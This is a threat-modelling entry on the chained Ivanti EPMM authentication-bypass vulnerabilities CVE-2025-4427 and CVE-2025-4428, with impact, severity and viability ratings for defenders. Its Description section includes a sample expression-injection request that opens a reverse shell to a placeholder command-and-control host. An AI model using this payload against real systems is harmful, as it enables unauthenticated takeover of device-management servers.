## 👁️ Description

> Ivanti EPMM - formerly known as MobileIron - is a Mobile Device
> Management solution (MDM) used to centrally manage corporate and
> private mobile phones across an organisation ref [1].  
> 
> A threat actor exploit a zero-day vulnerability in Ivanti EPMM
> system. In one of the threat actor campaigns was observed that
> the threat actor used even a second zero-day exploit chained to
> the fist one.  
> 
> The vulnerabilities could allow an attacker to bypass
> authentication mechanisms and gain unauthorised access
> to the system. 
> 
> The first used vulnerability is related to the handling of
> authentication tokens. An attacker can exploit this vulnerability
> by sending a crafted request to the `/api/v1/auth` endpoint.
> This flaw can be exploited without any prior authentication or
> authorisation ref [3].  
> 
> ### Vulnerabilities in Ivanti EPMM exploitation
> 
> - CVE-2025-4427: A vulnerability in the `/api/v1/auth` endpoint,
> which allows an attacker to bypass authentication by sending
> a crafted request with a malicious expression payload ref [3].
> - CVE-2025-4428: A vulnerability in the `/api/v1/users` endpoint,
> which allows an attacker to bypass authentication and gain access
> to sensitive user information by sending a crafted request with
> a malicious expression payload ref [3].
> 
> Based on the provided information from the reports and analysis
> there are several steps how a threat actor might exploit an
> authentication bypass vulnerability in Ivanti EPMM:
> 
> 1. Identify the vulnerable endpoint - the threat actor identifies
> a vulnerable endpoint, such as `/api/v1/auth` or `/api/v1/users`,
> which is susceptible to authentication bypass attacks.
> 2. Craft a malicious request - a threat actor crafts a malicious
> request with a specially designed payload, which can be an expression
> payload or a crafted authentication token.
> 
> A request such as :
> 
>   ```powershell
>   /mifs/rs/api/v2/featureusage?format=${''
>   .getClass().forName('java.lang.Runtime')
>   .getMethod('getRuntime').invoke(null)
>   .exec('sh -i >& /dev/tcp/C2.IP.Add.ress/8080 0>&1').waitFor()}
>   ```
> reaches the vulnerable validator before authentication, spawning a
> reverse shell.
> 3. Send the malicious request - threat actor sends the malicious
> request to the vulnerable endpoint, which can bypass the authentication
> mechanism and grant access to the system.
> 4. Gain unauthorised access - in the end as a final step a threat
> actor gains unauthorised access to the system, which can lead to
> further malicious activities, such as data breaches, lateral
> movement, or system compromise ref [4].  
> 



## 🖥️ Terrain 

 > A threat actors sends crafted queries to an Ivanti EPMM API endpoint
> used for authentication purposes in web applications. The threat actor
> is abusing a vulnerability in publicly exposed interface by sending
> queries without the need to be authorisated or authenticated.

## Model Data

#### **🛰️ Domains**

 > Infrastructure technologies domain of interest to attackers.

  - `🏢 Enterprise` : Generic databases, applications, machines and systems that are usually on premises or on Cloud traditional VMs.
 - `📱 Mobile` : Smartphones, tablets and applications running these devices.

---

#### **🎯 Targets**

 > Granular delimited technical entities holding a value to the organization, that are targeted by adversaries. They might be also involved in the detection coverage as the target of log collection. Partially inspired by Veris.

  - [`📱 Mobile phone`](http://veriscommunity.net/enums.html#section-asset) : User Device - Mobile phone or smartphone
 - [`🧩 API Endpoints`](http://veriscommunity.net/enums.html#section-asset) : Placeholder
 - [`👤 Identity Services`](http://veriscommunity.net/enums.html#section-asset) : Placeholder

---

#### **💿 Platforms concerned**

 > Actual technologies used by the organization that will be exploited by adversaries during a successful attack, and eventually of relevance for detection. Are named by commercial designation.

  - ` iOS` : Placeholder
 - ` Android` : Placeholder

---

#### **💣 Severity**

 > The severity summarizes the overall danger of incident the vector will provoke, and is to be derived (WIP) from impact, leverage, and difficulty to execute.

 [`⚠️ Significant incident`](https://www.ncsc.gov.uk/news/new-cyber-attack-categorisation-system-improve-uk-response-incidents) : A cyber attack which has a serious impact on a large organisation or on wider / local government, or which poses a considerable risk to central government or (inter)national essential services.

---

#### **🪄 Leverage acquisition**

 > Technical aftermath of the attack from the target perspective, differentiated from impact as it does not consider the value of the consequence, only what increased control the vector execution provides to the adversary.

  - [`💅 Elevation of privilege`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Capacity to augment leverage over the target system by upgrading the compromised access rights
 - [`💀 Infrastructure Compromise`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : The compromised target is likely to be used to further expand the sphere of influence of the attacker and allow more potent vectors to be executed.
 - [`🐒 Tampering`](https://owasp.org/www-community/Threat_Modeling_Process#stride) : Threat action intending to maliciously change or modify persistent data, such as records in a database, and the alteration of data in transit between two computers over an open network, such as the Internet.

---

#### **💥 Impact**

 > Analysis of the threat vector from the organizational perspective, in non technical term. This aims at putting a clear denomination on what the attacker will actually be able to act upon if the threat vector is realized.

  - [`🩼 Impairement`](http://veriscommunity.net/enums.html#section-impact) : Incapacitation of a particular key system that will cause disruptions in day-to-day operations, and eventually service delivery.
 - [`🛑 Business disruption`](http://veriscommunity.net/enums.html#section-impact) : Business disruption
 - [`🥸 Identity Theft`](http://veriscommunity.net/enums.html#section-impact) : Acquisition of sufficient information and privileges to profess as a given individual, for the purpose of abusing and deceiving human trust relationships.
 - [`🌍 Reputational Damages`](http://veriscommunity.net/enums.html#section-impact) : Damages to the organization public view may be achieved by using directly the access gained, or indirectly with data gathered.
 - [`🔓 Data Breach`](http://veriscommunity.net/enums.html#section-impact) : Non-public information has been accessed from the outside, and successfully extracted.

---

#### **🎲 Vector Viability**

 > Described with estimative language (likelyhood probability), describes how likely the analyst believes the vector to actually be realized on the organization infrastructure. Estimative language describes quality and credibility of underlying sources, data, and methodologies based Intelligence Community Directive 203 (ICD 203) and JP 2-0, Joint Intelligence.

 [`🧐 Likely`](https://www.dni.gov/files/documents/ICD/ICD%20203%20Analytic%20Standards.pdf) : Probable (probably) - 55-80%
